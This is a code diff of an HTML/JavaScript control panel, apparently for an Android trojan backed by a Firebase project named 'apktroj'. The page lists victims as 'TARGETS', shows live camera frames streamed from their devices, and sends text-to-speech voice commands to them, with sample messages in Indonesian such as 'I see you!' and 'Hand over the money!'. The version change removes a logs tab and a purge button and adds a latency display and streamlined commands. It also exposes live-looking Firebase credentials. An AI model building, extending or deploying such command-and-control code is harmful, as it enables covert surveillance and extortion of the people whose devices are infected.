@@ -3,73 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C.R Monitoring V1.3 - Voice Intercom</title>
+    <title>C.R Monitoring V1.4 - Optimized Video</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { background-color: #050505; color: #00ff00; font-family: 'Courier New', Courier, monospace; }
         .glitch-border { border: 1px solid #00ff00; box-shadow: 0 0 10px #00ff00; }
-        .victim-card { background: #111; border: 1px solid #222; border-radius: 8px; transition: 0.3s; }
-        .victim-card:hover { border-color: #ff0000; }
         .tab-btn { padding: 10px; border-bottom: 2px solid transparent; cursor: pointer; }
         .tab-btn.active { border-color: #ff0000; color: #ff0000; }
         .live-indicator { animation: blink 1s infinite; color: red; font-weight: bold; }
         @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
-        .mic-btn { background: #1a1a1a; border: 1px solid #00ff00; transition: 0.3s; }
-        .mic-btn:active { background: #00ff00; color: #000; scale: 0.95; }
+        #stream-img { width: 100%; height: 100%; object-fit: contain; }
     </style>
 </head>
 <body class="p-4">
     <div class="max-w-6xl mx-auto">
         <header class="flex justify-between items-center border-b border-green-900 pb-4 mb-6">
             <div>
-                <h1 class="text-3xl font-bold uppercase tracking-widest text-red-600">C.R COMMAND CENTER V1.3</h1>
-                <p class="text-xs text-gray-500">OWNER: GIGS | PERMANENT_SYSTEM ACTIVE</p>
+                <h1 class="text-3xl font-bold uppercase tracking-widest text-red-600">C.R COMMAND CENTER V1.4</h1>
+                <p class="text-xs text-gray-500 text-green-400">OPTIMIZED STREAMING MODE ACTIVE</p>
             </div>
-            <div class="text-right">
-                <button id="purge-all" class="text-xs border border-red-600 text-red-600 px-3 py-1 hover:bg-red-600 hover:text-white mb-2">PURGE ALL</button>
-                <div id="auth-info" class="text-[10px] text-gray-400">Connecting...</div>
-            </div>
+            <div id="auth-info" class="text-[10px] text-gray-400">Connecting...</div>
         </header>
 
         <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
+            <!-- Victim List -->
             <div class="lg:col-span-1 border-r border-green-900 pr-4">
                 <h2 class="text-lg font-bold mb-4">TARGETS</h2>
                 <div id="victim-list" class="space-y-2"></div>
             </div>
 
+            <!-- Display -->
             <div class="lg:col-span-3">
                 <div class="flex space-x-4 mb-4 border-b border-gray-800">
-                    <div class="tab-btn active" id="tab-intercom">INTERCOM & LIVE</div>
-                    <div class="tab-btn" id="tab-log">ACTIVITY LOGS</div>
+                    <div class="tab-btn active" id="tab-live">LIVE VIDEO BUFFER</div>
                 </div>
 
-                <!-- Intercom Panel -->
-                <div id="content-intercom" class="space-y-4">
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                        <div class="glitch-border p-4 bg-black">
-                            <h3 class="text-red-500 font-bold mb-2">LIVE FEED <span class="live-indicator ml-2">●</span></h3>
-                            <div class="aspect-video bg-gray-900 flex items-center justify-center border border-red-900">
-                                <img id="stream-img" class="w-full h-full object-contain hidden">
-                                <span id="stream-placeholder" class="text-gray-700">Waiting for target...</span>
-                            </div>
+                <div id="content-live" class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div class="glitch-border p-4 bg-black relative">
+                        <div class="flex justify-between items-center mb-2">
+                            <span class="text-xs text-red-500 font-bold uppercase">Streaming Feed</span>
+                            <span class="live-indicator" id="live-status">● IDLE</span>
                         </div>
-                        
-                        <div class="glitch-border p-4 bg-black flex flex-col justify-between">
-                            <div>
-                                <h3 class="text-blue-500 font-bold mb-2 text-center">VOICE TO TARGET</h3>
-                                <p class="text-[10px] text-gray-500 mb-4 text-center">Ketik pesan di bawah, target bakal denger suaranya.</p>
-                                <textarea id="voice-msg" class="w-full bg-gray-900 border border-blue-900 p-2 text-white text-sm outline-none h-24" placeholder="Contoh: 'Woi, gue liat lu!' atau 'Serahkan uangnya!'"></textarea>
-                                <button id="send-voice" class="w-full bg-blue-600 text-white font-bold py-2 mt-2 hover:bg-blue-700">SEND VOICE COMMAND</button>
-                            </div>
-                            <div class="mt-4 border-t border-gray-800 pt-2">
-                                <p class="text-xs text-yellow-500">Status: <span id="comm-status">Idle</span></p>
-                            </div>
+                        <div id="video-container" class="aspect-video bg-gray-900 flex items-center justify-center border border-red-900">
+                            <img id="stream-img" src="" class="hidden">
+                            <span id="placeholder" class="text-gray-700">Waiting for target...</span>
                         </div>
+                        <div class="absolute bottom-6 left-6 text-[10px] bg-black bg-opacity-50 p-1 text-white" id="latency-info"></div>
                     </div>
-                </div>
 
-                <div id="content-log" class="hidden">
-                    <div id="logs-container" class="max-h-[60vh] overflow-y-auto text-xs space-y-1"></div>
+                    <div class="glitch-border p-4 bg-black">
+                        <h3 class="text-blue-500 font-bold mb-2">VOICE INTERCOM</h3>
+                        <textarea id="voice-msg" class="w-full bg-gray-900 border border-blue-900 p-2 text-white text-sm outline-none h-32" placeholder="Ketik perintah suara..."></textarea>
+                        <button id="send-voice" class="w-full bg-blue-600 text-white font-bold py-2 mt-2">SPEAK TO TARGET</button>
+                    </div>
                 </div>
             </div>
         </div>
@@ -77,89 +63,61 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
-        import { getFirestore, collection, onSnapshot, addDoc, getDocs, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
+        import { getFirestore, collection, onSnapshot, doc, setDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
         import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
             authDomain: "apktroj.firebaseapp.com",
-            databaseURL: "https://apktroj-default-rtdb.firebaseio.com",
             projectId: "apktroj",
             storageBucket: "apktroj.firebasestorage.app",
             messagingSenderId: "943833619122",
-            appId: "1:943833619122:web:d757ced4d56267abf247ab",
-            measurementId: "G-WR01BDY3G6"
+            appId: "1:943833619122:web:d757ced4d56267abf247ab"
         };
 
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
         const auth = getAuth(app);
         const appId = "apktroj_v1";
-        const apiKey = ""; // API Key for Gemini TTS if needed, but we'll use simple field update
 
         onAuthStateChanged(auth, async (user) => {
             if (!user) await signInAnonymously(auth);
             else {
-                document.getElementById('auth-info').innerText = "SYSTEM ACTIVE: " + user.uid;
-                initApp();
+                document.getElementById('auth-info').innerText = "MONITOR ACTIVE: " + user.uid;
+                initMonitor();
             }
         });
 
-        // Tab Logic
-        document.querySelectorAll('.tab-btn').forEach(btn => {
-            btn.addEventListener('click', () => {
-                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-                btn.classList.add('active');
-                document.getElementById('content-intercom').classList.toggle('hidden', btn.id !== 'tab-intercom');
-                document.getElementById('content-log').classList.toggle('hidden', btn.id !== 'tab-log');
-            });
-        });
-
-        async function initApp() {
-            const logsRef = collection(db, 'artifacts', appId, 'public', 'data', 'victim_logs');
-            onSnapshot(logsRef, (snap) => {
-                const streamImg = document.getElementById('stream-img');
-                const streamPlaceholder = document.getElementById('stream-placeholder');
-                
+        function initMonitor() {
+            // Listen to stream buffer (only 1 doc per target)
+            const streamCol = collection(db, 'artifacts', appId, 'public', 'data', 'stream_buffer');
+            onSnapshot(streamCol, (snap) => {
                 snap.forEach(docSnap => {
                     const data = docSnap.data();
-                    if(data.action === "LIVE_FRAME") {
-                        streamImg.src = data.frame;
-                        streamImg.classList.remove('hidden');
-                        streamPlaceholder.classList.add('hidden');
+                    const img = document.getElementById('stream-img');
+                    const ph = document.getElementById('placeholder');
+                    
+                    if (data.frame) {
+                        img.src = data.frame;
+                        img.classList.remove('hidden');
+                        ph.classList.add('hidden');
+                        document.getElementById('live-status').innerText = "● STREAMING";
+                        const lat = Date.now() - data.timestamp;
+                        document.getElementById('latency-info').innerText = `Latency: ${lat}ms`;
                     }
-                    // Populate logs simple
-                    const log = document.createElement('div');
-                    log.innerText = `[${new Date(data.timestamp).toLocaleTimeString()}] ${data.action}`;
-                    document.getElementById('logs-container').prepend(log);
                 });
             });
         }
 
-        // Send Voice Command to Target
         document.getElementById('send-voice').onclick = async () => {
-            const msg = document.getElementById('voice-msg').value;
-            if(!msg) return;
-            
-            document.getElementById('comm-status').innerText = "Sending...";
-            try {
-                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'commands'), {
-                    type: "TTS_VOICE",
-                    text: msg,
-                    timestamp: Date.now()
-                });
-                document.getElementById('comm-status').innerText = "Sent Successfully!";
-                document.getElementById('voice-msg').value = "";
-                setTimeout(() => document.getElementById('comm-status').innerText = "Idle", 2000);
-            } catch (e) {
-                document.getElementById('comm-status').innerText = "Failed!";
-            }
-        };
-
-        document.getElementById('purge-all').onclick = async () => {
-            const snapshot = await getDocs(collection(db, 'artifacts', appId, 'public', 'data', 'victim_logs'));
-            snapshot.forEach(d => deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'victim_logs', d.id)));
-            location.reload();
+            const txt = document.getElementById('voice-msg').value;
+            if(!txt) return;
+            // Use fixed ID for commands to avoid bloat
+            await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'commands', 'voice_cmd'), {
+                text: txt,
+                timestamp: Date.now()
+            });
+            document.getElementById('voice-msg').value = "";
         };
     </script>
 </body>
